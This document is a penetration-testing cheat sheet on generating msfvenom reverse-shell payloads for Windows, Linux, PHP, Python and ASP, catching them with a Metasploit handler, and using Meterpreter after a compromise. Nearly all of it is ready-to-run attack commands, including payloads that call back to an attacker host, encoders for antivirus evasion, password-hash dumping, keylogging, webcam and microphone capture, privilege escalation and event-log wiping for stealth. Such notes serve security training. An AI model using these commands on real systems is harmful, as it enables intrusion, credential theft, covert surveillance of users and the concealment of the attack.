# Msfvenom & Handlers

Msfvenom generates custom payloads (replacement for Msfpayload and Msfencode). Handlers catch the connection.

## Msfvenom Basics

## List Payloads and Formats



`msfvenom -l payloads`



`msfvenom --list formats`

## Standard Syntax



`msfvenom -p [payload] LHOST=[your_ip] LPORT=[your_port] -f [format] > [output_file]`

## Common Payloads

## Windows Executable (.exe)



`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > rev_shell.exe`

## Linux Executable (.elf)



`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f elf > rev_shell.elf`

Don't forget to run `chmod +x rev_shell.elf` on the target!

## PHP Reverse Shell (.php)



`msfvenom -p php/meterpreter_reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > rev_shell.php`

⚠️ Often you need to manually add `<?php` at the beginning and `?>` at the end.

## Python Script (.py)



`msfvenom -p cmd/unix/reverse_python LHOST=[IP] LPORT=[PORT] -f raw > rev_shell.py`

## ASP Script (.asp)



`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f asp > rev_shell.asp`

## Multi Handler (Listener)

To catch reverse shells, you must always start a listener that matches your payload.

## Listener Setup



`use exploit/multi/handler`



`set payload [payload_used_in_msfvenom]`



`set LHOST [your_ip]`



`set LPORT [your_port]`



`run`

## Encoders

Encoders (like Shikata Ga Nai) encrypt the payload, but are rarely enough to bypass modern antivirus.

## Encoder Example



`msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP] -f raw -e php/base64`

---

# Meterpreter

Meterpreter is an advanced payload that runs in-memory (leaves no files on disk) and is used for post-exploitation.

## Key Features

- **In-Memory Only:** Runs entirely in RAM to avoid antivirus detection
    
- **Encrypted Communication:** Uses encrypted connections (TLS) to bypass IPS/IDS
    
- **Process Migration:** Can move itself to other processes (e.g., from spoolsv.exe to explorer.exe)
    
- **Extensible:** Functionality expandable via extensions and scripts
    

## Common Meterpreter Commands

## Basic System Info & Identification



`sysinfo`

Shows system details (OS, Architecture, Domain, etc.)



`getuid`

Shows the current user (e.g., NT AUTHORITY\SYSTEM)



`getpid`

Shows the current Process ID of Meterpreter

## Process Management



`ps`

Shows list of running processes



`migrate [PID]`

Moves Meterpreter to another process ID

## File Management



`ls`

Show files in current directory



`pwd`

Print Working Directory (current directory)



`cd [directory]`

Change directory (sometimes put path in quotes)



`download [file]`

Download file from target to your machine



`upload [file]`

Upload file from your machine to target



`search -f [filename]`

Search for files on the target

## Network



`ifconfig`

or



`ipconfig`

Show network interfaces and IP addresses



`netstat`

Show network connections



`arp`

Show ARP table

## Advanced Features



`hashdump`

Dumps password hashes (requires SYSTEM privileges)



`screenshot`

Takes screenshot of target desktop



`shell`

Opens a standard OS shell (cmd.exe / /bin/bash)



`background`

Puts current session in background (returns to msf)



`clearev`

Wipes Windows Event Logs (for stealth)

## User Activity Monitoring



`idletime`

Shows number of seconds user has been inactive



`screenshare`

View remote desktop in real-time



`screenshot`

Takes a screenshot of the current desktop

## Keylogging (Record Keystrokes)



`keyscan_start`

Starts recording keystrokes



`keyscan_dump`

Shows recorded keystrokes



`keyscan_stop`

Stops the keylogger

## Webcam & Audio



`webcam_list`

Shows available webcams



`webcam_snap`

Takes a photo with the webcam



`webcam_stream`

Starts a live video stream



`webcam_chat`

Starts a video chat session



`record_mic`

Records audio via microphone (default X seconds)

## Pro Tips

- Use `migrate` to a stable process (like explorer.exe or services.exe) immediately after entry for stability
    
- `getsystem` command can attempt to automatically gain SYSTEM privileges
    
- With `shell` you get a normal command prompt, type `exit` to return to Meterpreter